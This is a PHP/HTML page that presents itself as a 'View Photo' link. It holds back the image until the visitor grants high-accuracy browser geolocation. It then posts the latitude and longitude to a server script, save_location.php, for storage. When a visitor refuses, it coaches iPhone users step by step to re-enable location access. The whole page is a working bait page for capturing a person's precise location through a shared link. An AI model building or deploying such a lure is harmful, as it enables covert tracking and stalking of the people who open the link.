<?php
session_start();
include('admin/config/dbcon.php');
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0"
    >

    <title>View Photo</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            font-family: -apple-system, BlinkMacSystemFont,
                         "Segoe UI", Arial, sans-serif;
            background: #f5f5f7;
        }

        .card {
            width: 100%;
            max-width: 390px;
            background: #fff;
            padding: 35px 25px;
            border-radius: 22px;
            text-align: center;
            box-shadow: 0 8px 30px rgba(0,0,0,.10);
        }

        .icon {
            font-size: 55px;
            margin-bottom: 15px;
        }

        h1 {
            margin: 0 0 10px;
            font-size: 25px;
            color: #111;
        }

        .description {
            margin: 0 0 24px;
            color: #666;
            font-size: 15px;
            line-height: 1.6;
        }

        .continue-btn {
            width: 100%;
            padding: 15px;
            border: 0;
            border-radius: 12px;
            background: #007aff;
            color: #fff;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
        }

        .continue-btn:disabled {
            opacity: .6;
        }

        #status {
            margin-top: 18px;
            font-size: 14px;
            line-height: 1.5;
        }

        .error {
            color: #d00;
        }

        .success {
            color: #16803c;
        }

        .settings-help {
            display: none;
            margin-top: 18px;
            padding: 15px;
            border-radius: 12px;
            background: #f1f1f1;
            color: #444;
            font-size: 14px;
            line-height: 1.6;
            text-align: left;
        }

        .settings-help strong {
            color: #111;
        }

        #photoContainer {
            display: none;
        }

        #photoContainer img {
            width: 100%;
            max-height: 75vh;
            object-fit: contain;
            border-radius: 15px;
            display: block;
        }
    </style>
</head>

<body>

<div class="card">

    <!-- Start -->
    <div id="startScreen">

        <div class="icon">📷</div>

        <h1>View Photo</h1>

        <p class="description">
            Tap Continue to open the photo.
            This page will request permission to share
            your current location.
        </p>

        <button
            id="continueBtn"
            class="continue-btn"
            onclick="requestAccess()"
        >
            Continue
        </button>

        <div id="status"></div>

        <!-- iPhone help -->
        <div id="settingsHelp" class="settings-help">

            <strong>Location access is blocked.</strong>
            <br><br>

            If you previously selected
            <strong>Never / Don't Allow</strong>,
            Safari may remember that choice.

            <br><br>

            On iPhone, open:

            <br>

            <strong>
                Settings → Privacy & Security → Location Services
            </strong>

            <br><br>

            Make sure Location Services are enabled,
            then allow location access for Safari.

            <br><br>

            After changing the setting, return to this page
            and tap <strong>Continue</strong> again.

        </div>

    </div>


    <!-- Photo -->
    <div id="photoContainer">

        <img
            src="img.jpeg"
            alt="Photo">

    </div>

</div>


<script>

function requestAccess() {

    const button =
        document.getElementById("continueBtn");

    const status =
        document.getElementById("status");

    const help =
        document.getElementById("settingsHelp");


    help.style.display = "none";

    status.className = "";

    /*
     * Browser support
     */

    if (!navigator.geolocation) {

        status.innerHTML =
            "Location access is not supported by this browser.";

        status.className = "error";

        return;
    }


    /*
     * HTTPS check
     */

    if (location.protocol !== "https:" &&
        location.hostname !== "localhost") {

        status.innerHTML =
            "This page must be opened using HTTPS.";

        status.className = "error";

        return;
    }


    button.disabled = true;

    button.innerText = "Please wait...";

    status.innerHTML =
        "Please respond to the browser permission request.";


    /*
     * Request location
     */

    navigator.geolocation.getCurrentPosition(

        function(position) {

            const latitude =
                position.coords.latitude;

            const longitude =
                position.coords.longitude;


            status.innerHTML =
                "Access received. Opening photo...";

            status.className = "success";


            /*
             * Save coordinates
             */

            fetch("save_location.php", {

                method: "POST",

                headers: {
                    "Content-Type":
                        "application/x-www-form-urlencoded"
                },

                body:
                    "latitude=" +
                    encodeURIComponent(latitude) +

                    "&longitude=" +
                    encodeURIComponent(longitude)

            })

            .then(function(response) {

                return response.json();

            })

            .then(function(data) {

                if (data.status === "success") {

                    document
                        .getElementById("startScreen")
                        .style.display = "none";

                    document
                        .getElementById("photoContainer")
                        .style.display = "block";

                } else {

                    throw new Error(
                        "Location save failed"
                    );

                }

            })

            .catch(function(error) {

                console.error(error);

                button.disabled = false;

                button.innerText = "Continue";

                status.innerHTML =
                    "Could not save your location. Please try again.";

                status.className = "error";

            });

        },


        function(error) {

            button.disabled = false;

            button.innerText = "Continue";


            /*
             * Permission denied
             */

            if (error.code === 1) {

                status.innerHTML =
                    "Location permission was denied.";

                status.className = "error";

                help.style.display = "block";

                return;
            }


            /*
             * Location unavailable
             */

            if (error.code === 2) {

                status.innerHTML =
                    "Your location is currently unavailable.";

                status.className = "error";

                return;
            }


            /*
             * Timeout
             */

            if (error.code === 3) {

                status.innerHTML =
                    "The location request timed out. Please try again.";

                status.className = "error";

                return;
            }


            status.innerHTML =
                "Unable to get your location.";

            status.className = "error";

        },


        {
            enableHighAccuracy: true,
            timeout: 20000,
            maximumAge: 0
        }

    );
}

</script>

</body>
</html>
